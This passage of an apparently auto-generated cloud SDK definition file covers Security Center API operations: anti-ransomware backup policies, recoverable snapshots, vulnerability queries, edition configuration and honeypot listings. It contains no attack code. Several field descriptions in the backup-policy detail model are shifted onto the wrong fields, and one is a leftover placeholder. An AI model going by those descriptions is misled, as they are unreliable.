*   **UNKNOWN**: unknown
*   **INSTALLED**: installed
*   **INSTALL_FAILED**: installation failed
*   **UNINSTALL_FAILED**: uninstallation failed', example='INSTALLED'),
      databaseName?: string(name='DatabaseName', description='The name of the database.', example='abc123'),
      databaseType?: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **MSSQL**
*   **Oracle**', example='MYSQL'),
      errorCode?: string(name='ErrorCode', description='The error code returned when the backup task fails.', example='EXPIRED'),
      errorMessage?: string(name='ErrorMessage', description='The error message for the anti-ransomware policy.', example='AttachRamRoleError'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-9dp7mubt5wit6g0h****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-001'),
      instanceStatus?: string(name='InstanceStatus', description='The status of the Elastic Compute Service (ECS) instance. Valid values:

*   **Stopped**
*   **Running**', example='Running'),
      instanceUuid?: string(name='InstanceUuid', description='The UUID of the agent that is used to back up the data of the database.', example='cf1bcad4063f11ed800000163e0e****'),
      latestBackResult?: string(name='LatestBackResult', description='The execution result of the last backup task.', example='completed'),
      latestBackupTime?: string(name='LatestBackupTime', description='The time when the last backup task was executed.', example='2022-01-01 00:00:11'),
      planStatus?: string(name='PlanStatus', description='The status of the backup task. Valid values:

*   **init**: initializing
*   **running**: running
*   **completed**: complete
*   **restoring**: restoring
*   **creating**: creating
*   **created**: created', example='creating'),
      policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.', example='123'),
      policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='auto_oracle_37f'),
      policyStatus?: string(name='PolicyStatus', description='The status of the anti-ransomware policy. Valid values:

*   **initiating**: initializing
*   **opening**: enabled
*   **closing**: disabled
*   **deleting**: deleting', example='opening'),
      uniRegionId?: string(name='UniRegionId', description='The region ID of the server that hosts the database.', example='cn-hangzhou'),
    }
  ](name='UniBackupPolicies', description='An array that consists of the anti-ransomware policies.'),
}

model DescribeUniBackupPoliciesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniBackupPoliciesResponseBody(name='body'),
}

async function describeUniBackupPoliciesWithOptions(request: DescribeUniBackupPoliciesRequest, runtime: Util.RuntimeOptions): DescribeUniBackupPoliciesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.policyName)) {
    query['PolicyName'] = request.policyName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniBackupPolicies',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUniBackupPolicies(request: DescribeUniBackupPoliciesRequest): DescribeUniBackupPoliciesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniBackupPoliciesWithOptions(request, runtime);
}

model DescribeUniBackupPolicyDetailRequest {
  policyId?: string(name='PolicyId', description='$.parameters[2].schema.enumValueTitles', example='123'),
}

model DescribeUniBackupPolicyDetailResponseBody = {
  requestId?: string(name='RequestId', description='The data returned.', example='F35F45B0-5D6B-4238-BE02-A62D0760****'),
  uniBackupPolicyDTO?: {
    accountName?: string(name='AccountName', description='The status of the database client. Valid values:

*   **UNKNOWN**: unknown
*   **INSTALLED**: installed
*   **INSTALL_FAILED**: installation failed
*   **UNINSTALL_FAILED**: uninstallation failed', example='admin'),
    agentStatus?: string(name='AgentStatus', description='The ID of the anti-ransomware policy.', example='INSTALLED'),
    databaseType?: string(name='DatabaseType', description='The status of the anti-ransomware policy. Valid values:

*   **initiating**: initializing
*   **opening**: enabled
*   **closing**: disabled
*   **deleting**: deleting', example='ORACLE'),
    fullPlan?: {
      days?: [ string ](name='Days', description='The interval of backup tasks.'),
      interval?: int32(name='Interval', description='The unit of the interval. Valid values:

*   **hourly**: hour
*   **daily**: day
*   **weekly**: week', example='2'),
      planType?: string(name='PlanType', description='The time when the full backup started. The time is in the HH:mm:ss format.', example='daily'),
      startTime?: string(name='StartTime', description='The details of the policy for full backup.', example='00:10:00'),
    }(name='FullPlan', description='The name of the database account.'),
    incPlan?: {
      days?: [ string ](name='Days', description='The interval of backup tasks.'),
      interval?: int32(name='Interval', description='The unit of the interval. Valid values:

*   **hourly**: hour
*   **daily**: day
*   **weekly**: week', example='2'),
      planType?: string(name='PlanType', description='The time when the incremental backup started. The time is in the HH:mm:ss format.', example='daily'),
      startTime?: string(name='StartTime', description='The details of the policy for incremental backup.', example='00:10:00'),
    }(name='IncPlan', description='The day of a week on which the backup is performed. Valid values:

*   **0**: Sunday
*   **1**: Monday
*   **2**: Tuesday
*   **3**: Wednesday
*   **4**: Thursday
*   **5**: Friday
*   **6**: Saturday'),
    instanceId?: string(name='InstanceId', description='The name of the anti-ransomware policy.', example='i-2zefcy2id5d60m9t****'),
    instanceName?: string(name='InstanceName', description='The type of the database. Valid values:

*   **MYSQL**
*   **MSSQL**
*   **Oracle**', example='sql-test-01'),
    policyId?: long(name='PolicyId', description='The ID of the server.', example='123'),
    policyName?: string(name='PolicyName', description='The maximum network bandwidth that is allowed during data backup. Unit: bytes.', example='auto_test_sql'),
    policyStatus?: string(name='PolicyStatus', description='The details of the anti-ransomware policy.', example='opening'),
    retention?: int32(name='Retention', description='The name of the server.', example='7'),
    speedLimiter?: long(name='SpeedLimiter', description='The retention period of the backup snapshot.', example='5242880'),
  }(name='UniBackupPolicyDTO', description='The ID of the request, which is used to locate and troubleshoot issues.'),
}

model DescribeUniBackupPolicyDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniBackupPolicyDetailResponseBody(name='body'),
}

async function describeUniBackupPolicyDetailWithOptions(request: DescribeUniBackupPolicyDetailRequest, runtime: Util.RuntimeOptions): DescribeUniBackupPolicyDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniBackupPolicyDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUniBackupPolicyDetail(request: DescribeUniBackupPolicyDetailRequest): DescribeUniBackupPolicyDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniBackupPolicyDetailWithOptions(request, runtime);
}

model DescribeUniRecoverableListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  database?: string(name='Database', description='The name of the database.', example='msdb'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='123'),
}

model DescribeUniRecoverableListResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  database?: string(name='Database', description='The name of the database.', example='msdb'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  recoverableInfoList?: [ 
    {
      firstTime?: long(name='FirstTime', description='The timestamp of the first backup. Unit: milliseconds.', example='1671468180000'),
      lastTime?: long(name='LastTime', description='The timestamp of the last backup. Unit: milliseconds.', example='1671468180000'),
      resetScn?: string(name='ResetScn', description='The identifier of the point in time for restoration in the backup version that is used. The database is an Oracle database.', example='4529940.0'),
      resetTime?: long(name='ResetTime', description='The point in time for restoration in the backup version that is used. The database is an Oracle database.', example='2021-01-30 08:04:36'),
      restoreInfo?: string(name='RestoreInfo', description='The information about the database. This parameter is available when the database is a Microsoft SQL Server (MSSQL) database. The value is a JSON string. Valid values:

*   **name**: the name of the database
*   **files**: the path to the database files', example='{
      "files": {
            "qtc": "F:\\\\database\\\\qtc.mdf",
            "qtc_log": "F:\\\\database\\\\qtc_0.ldf"
      },
      "name": "qtc"
}'),
    }
  ](name='RecoverableInfoList', description='An array that consists of the backup snapshots.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760****'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='23'),
}

model DescribeUniRecoverableListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniRecoverableListResponseBody(name='body'),
}

async function describeUniRecoverableListWithOptions(request: DescribeUniRecoverableListRequest, runtime: Util.RuntimeOptions): DescribeUniRecoverableListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.database)) {
    query['Database'] = request.database;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniRecoverableList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUniRecoverableList(request: DescribeUniRecoverableListRequest): DescribeUniRecoverableListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniRecoverableListWithOptions(request, runtime);
}

model DescribeUniSupportRegionResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760****'),
  uniSupportRegion?: [ string ](name='UniSupportRegion', description='An array consisting of the region that is supported by anti-ransomware for databases.'),
}

model DescribeUniSupportRegionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniSupportRegionResponseBody(name='body'),
}

async function describeUniSupportRegionWithOptions(runtime: Util.RuntimeOptions): DescribeUniSupportRegionResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeUniSupportRegion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUniSupportRegion(): DescribeUniSupportRegionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniSupportRegionWithOptions(runtime);
}

model DescribeUserBackupMachinesResponseBody = {
  machines?: [ 
    {
      id?: long(name='Id', example='123'),
      policyName?: string(name='PolicyName', example='policy_name_A'),
      uuid?: string(name='Uuid', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****'),
    }
  ](name='Machines'),
  requestId?: string(name='RequestId', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
}

model DescribeUserBackupMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUserBackupMachinesResponseBody(name='body'),
}

async function describeUserBackupMachinesWithOptions(runtime: Util.RuntimeOptions): DescribeUserBackupMachinesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeUserBackupMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUserBackupMachines(): DescribeUserBackupMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUserBackupMachinesWithOptions(runtime);
}

model DescribeUserBaselineAuthorizationRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId', description='资产所有者ID。', example='1519712934213764'),
  sourceIp?: string(name='SourceIp', description='The ID of the asset owner.', example='1.2.3.4'),
}

model DescribeUserBaselineAuthorizationResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='0AF20EB0-EBBC-4B94-9B84-F3BAFAC53EDE'),
  userBaselineAuthorization?: {
    status?: int32(name='Status', description='Indicates whether Security Center is authorized to run configuration checks on cloud services.

*   **0**: no. Security Center is not authorized to run configuration checks on cloud services.
*   **1**: yes. Security Center is authorized to run configuration checks on cloud services.', example='1'),
  }(name='UserBaselineAuthorization', description='The information about whether Security Center is authorized to run configuration checks on cloud services.'),
}

model DescribeUserBaselineAuthorizationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUserBaselineAuthorizationResponseBody(name='body'),
}

async function describeUserBaselineAuthorizationWithOptions(request: DescribeUserBaselineAuthorizationRequest, runtime: Util.RuntimeOptions): DescribeUserBaselineAuthorizationResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUserBaselineAuthorization',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUserBaselineAuthorization(request: DescribeUserBaselineAuthorizationRequest): DescribeUserBaselineAuthorizationResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUserBaselineAuthorizationWithOptions(request, runtime);
}

model DescribeUserLayoutAuthorizationRequest {
  lang?: string(name='Lang', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeUserLayoutAuthorizationResponseBody = {
  authorized?: boolean(name='Authorized', example='false'),
  requestId?: string(name='RequestId', example='4A80EE8F-2175-49DA-B8BF-FAE1B3D52E4C'),
}

model DescribeUserLayoutAuthorizationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUserLayoutAuthorizationResponseBody(name='body'),
}

async function describeUserLayoutAuthorizationWithOptions(request: DescribeUserLayoutAuthorizationRequest, runtime: Util.RuntimeOptions): DescribeUserLayoutAuthorizationResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUserLayoutAuthorization',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUserLayoutAuthorization(request: DescribeUserLayoutAuthorizationRequest): DescribeUserLayoutAuthorizationResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUserLayoutAuthorizationWithOptions(request, runtime);
}

model DescribeUuidsByVulNamesRequest {
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is handled. Valid values:

**y**: The vulnerability is handled. **n**: The vulnerability is not handled.', example='n'),
  fieldName?: string(name='FieldName', description='The name of the search field that is used to query containers.', example='namespace'),
  fieldValue?: string(name='FieldValue', description='The value of the search field that is used to query containers.', example='cas-adad-qeqwe'),
  groupId?: long(name='GroupId', description='The ID of the asset group.', example='11286014'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  level?: string(name='Level', description='The severity of the vulnerability. Separate multiple severities with commas (,). Valid values:

*   **high**
*   **medium**
*   **low**', example='high,low'),
  necessity?: string(name='Necessity', description='The priority based on which the vulnerability is fixed. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap,later,nntf'),
  remark?: string(name='Remark', description='The remarks for the asset affected by the vulnerability. The value can be the private IP address, public IP address, or name of the asset. Fuzzy match is supported.', example='10.7.'),
  searchTags?: string(name='SearchTags', description='The tags that are used to search for the vulnerability.', example='oval'),
  statusList?: string(name='StatusList', description='The status of the vulnerability. Separate multiple states with commas (,). Valid values:

*   **1**: unfixed
*   **4**: being fixed
*   **7**: fixed', example='1,4'),
  tag?: string(name='Tag', description='The tag of the vulnerability.', example='oval'),
  targetType?: string(name='TargetType', description='The type of the query condition. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the ID of the asset', example='uuid'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability
*   **emg**: urgent vulnerability
*   **sca**: vulnerability that is detected based on software component analysis', example='cve'),
  vpcInstanceIds?: string(name='VpcInstanceIds', description='The ID of the virtual private cloud (VPC) in which the vulnerability is detected. Separate multiple IDs with commas (,).', example='vpc-uf6ssrvbrwe37ekw****,vpc-bp1aevy8sofi8mh1q****'),
  vulNames?: [ string ](name='VulNames', description='An array that consists of the names of vulnerabilities.

>  You can call the [DescribeGroupedVul](~~DescribeGroupedVul~~) operation to obtain the names of vulnerabilities.'),
}

model DescribeUuidsByVulNamesResponseBody = {
  machineInfoStatistics?: [ 
    {
      machineInstanceId?: string(name='MachineInstanceId', description='The ID of the server.', example='i-wz9gd1os5talju****'),
      machineIp?: string(name='MachineIp', description='The IP address of the server.', example='192.168.XX.XX'),
      machineName?: string(name='MachineName', description='The name of the server.', example='TestMachine'),
      os?: string(name='Os', description='The name of the operating system that the server runs.', example='windows'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-hangzhou'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='18375c64-eaa2-4702-92b0-4ee7******'),
    }
  ](name='MachineInfoStatistics', description='An array that consists of the statistics about the assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='97286A-4A6B-4A4-95FA-EC7E3E2451'),
}

model DescribeUuidsByVulNamesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUuidsByVulNamesResponseBody(name='body'),
}

async function describeUuidsByVulNamesWithOptions(request: DescribeUuidsByVulNamesRequest, runtime: Util.RuntimeOptions): DescribeUuidsByVulNamesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.fieldName)) {
    query['FieldName'] = request.fieldName;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.level)) {
    query['Level'] = request.level;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.searchTags)) {
    query['SearchTags'] = request.searchTags;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.vpcInstanceIds)) {
    query['VpcInstanceIds'] = request.vpcInstanceIds;
  }
  if (!Util.isUnset(request.vulNames)) {
    query['VulNames'] = request.vulNames;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUuidsByVulNames',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUuidsByVulNames(request: DescribeUuidsByVulNamesRequest): DescribeUuidsByVulNamesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUuidsByVulNamesWithOptions(request, runtime);
}

model DescribeVendorListResponseBody = {
  requestId?: string(name='RequestId', example='340D7FC4-D575-1661-8ACD-CFA7BE57B795'),
  vendorNameList?: [ string ](name='VendorNameList'),
}

model DescribeVendorListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVendorListResponseBody(name='body'),
}

async function describeVendorListWithOptions(runtime: Util.RuntimeOptions): DescribeVendorListResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeVendorList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVendorList(): DescribeVendorListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVendorListWithOptions(runtime);
}

model DescribeVersionConfigRequest {
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId', description='The ID of the Alibaba Cloud account that uses Security Center.

> You can call the [GetUser](~~28681~~) operation to query the IDs of Alibaba Cloud accounts.', example='127608589417****'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.0.XX.XX'),
}

model DescribeVersionConfigResponseBody = {
  allowPartialBuy?: int32(name='AllowPartialBuy', description='Indicates whether the pay-as-you-go billing method is supported.

*   **0**: no
*   **1**: yes', example='1'),
  appWhiteList?: int32(name='AppWhiteList', description='Indicates whether the application whitelist feature is enabled. Valid values:

*   **0**: no
*   **2**: yes', example='2'),
  appWhiteListAuthCount?: long(name='AppWhiteListAuthCount', description='The quota for the application whitelist feature.

> The quantity of servers that are allowed by the quota is deducted by one each time you apply an application whitelist to a server. After you enable the application whitelist feature, the quota is 20 by default.', example='20'),
  assetLevel?: int32(name='AssetLevel', description='The quota for servers that can be protected.', example='30'),
  highestVersion?: int32(name='HighestVersion', description='The most advanced edition that is used. Valid values:

*   **1**: Basic edition
*   **3**: Enterprise edition
*   **5**: Advanced edition
*   **6**: Anti-virus edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition

> If you purchase the Multi-version edition of Security Center, the value indicates the most advanced edition that is used in the Multi-version edition. If you do not purchase the Multi-version edition of Security Center, the value indicates the edition of Security Center.', example='1'),
  honeypotCapacity?: long(name='HoneypotCapacity', description='The number of honeypots.', example='20'),
  imageScanCapacity?: long(name='ImageScanCapacity', description='The quota for the container image scan feature.', example='8954'),
  instanceId?: string(name='InstanceId', description='The ID of purchased Security Center.', example='sas-vg6hafdsafs****'),
  isNewContainerVersion?: boolean(name='IsNewContainerVersion', description='Indicates whether Security Center runs the latest version of the Ultimate edition.

*   **true**: yes
*   **false**: no', example='true'),
  isNewMultiVersion?: boolean(name='IsNewMultiVersion', description='Indicates whether Security Center runs the latest version of the Multi-version edition.

*   **true**: yes
*   **false**: no', example='true'),
  isOverBalance?: boolean(name='IsOverBalance', description='Indicates whether the number of existing servers exceeds the purchased quota. Valid values:

*   **false**: no
*   **true**: yes', example='false'),
  isTrialVersion?: int32(name='IsTrialVersion', description='Indicates whether Security Center runs the free trial edition. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
  lastTrailEndTime?: long(name='LastTrailEndTime', description='The timestamp when the last trial ends. Unit: milliseconds.', example='1603934844000'),
  MVAuthCount?: int32(name='MVAuthCount', description='The total quota in the Multi-version edition of purchased Security Center.', example='5000'),
  MVUnusedAuthCount?: int32(name='MVUnusedAuthCount', description='The total remaining quota in the Multi-version edition of purchased Security Center.', example='40'),
  openTime?: long(name='OpenTime', description='The timestamp when Security Center is purchased. Unit: milliseconds.', example='1657244824669'),
  releaseTime?: long(name='ReleaseTime', description='The timestamp when Security Center is released. Unit: milliseconds. The value of this parameter is seven days after Security Center expires.

> If you do not renew the subscription within seven days after the expiration date, the Value-added Plan, Anti-virus, Advanced, or Enterprise edition is downgraded to the Basic edition. In this case, you can no longer view the existing configurations or statistics such as DDoS alerts. You must purchase the Anti-virus, Advanced, or Enterprise edition to continue using relevant features. For more information, see [Purchase Security Center](~~42308~~).', example='1625846400000'),
  requestId?: string(name='RequestId', description='The request ID.', example='C2DC96D2-DD2E-49D9-A28E-85590475DF55'),
  sasLog?: int32(name='SasLog', description='Indicates whether the log analysis feature is purchased. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  sasScreen?: int32(name='SasScreen', description='Indicates whether the security screen feature is purchased. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
  slsCapacity?: long(name='SlsCapacity', description='The log storage capacity that you purchase. Unit: GB. Valid values: 0 to 200000.', example='10240'),
  threatAnalysisCapacity?: long(name='ThreatAnalysisCapacity', description='The purchased log storage capacity for threat analysis. Unit: GB.', example='25'),
  userDefinedAlarms?: int32(name='UserDefinedAlarms', description='Indicates whether the custom alerting feature is enabled. Valid values:

*   **0**: no
*   **2**: yes', example='0'),
  version?: int32(name='Version', description='The edition of purchased Security Center. Valid values:

*   **1**: Basic edition
*   **3**: Enterprise edition
*   **5**: Advanced edition
*   **6**: Anti-virus edition
*   **7**: Ultimate edition
*   **8**: Multi-version edition
*   **10**: Value-added Plan edition', example='3'),
  vmCores?: int32(name='VmCores', description='The quota for the cores of servers that can be protected.', example='10'),
  webLock?: int32(name='WebLock', description='Indicates whether the web tamper proofing feature is enabled. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
  webLockAuthCount?: long(name='WebLockAuthCount', description='The quota for the web tamper proofing feature. The quantity of servers that are allowed by the quota is deducted by one each time you enable the web tamper proofing feature for a server. Valid values: 0 to N.

> N indicates the number of servers that you own.', example='0'),
}

model DescribeVersionConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVersionConfigResponseBody(name='body'),
}

async function describeVersionConfigWithOptions(request: DescribeVersionConfigRequest, runtime: Util.RuntimeOptions): DescribeVersionConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVersionConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVersionConfig(request: DescribeVersionConfigRequest): DescribeVersionConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVersionConfigWithOptions(request, runtime);
}

model DescribeVpcHoneyPotCriteriaRequest {
  lang?: string(name='Lang', example='zh'),
}

model DescribeVpcHoneyPotCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', example='vpcRegionId'),
      type?: string(name='Type', example='select'),
      values?: string(name='Values', example='ap-southeast-2,eu-west-1'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId', example='FCE38ADB-7361-4212-AD87-A4514E4DF925'),
}

model DescribeVpcHoneyPotCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeVpcHoneyPotCriteriaResponseBody(name='body'),
}

async function describeVpcHoneyPotCriteriaWithOptions(request: DescribeVpcHoneyPotCriteriaRequest, runtime: Util.RuntimeOptions): DescribeVpcHoneyPotCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVpcHoneyPotCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeVpcHoneyPotCriteria(request: DescribeVpcHoneyPotCriteriaRequest): DescribeVpcHoneyPotCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVpcHoneyPotCriteriaWithOptions(request, runtime);
}

model DescribeVpcHoneyPotListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='2'),
  honeyPotExistence?: boolean(name='HoneyPotExistence', description='Specifies whether the cloud honeypot feature is enabled for the VPCs. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
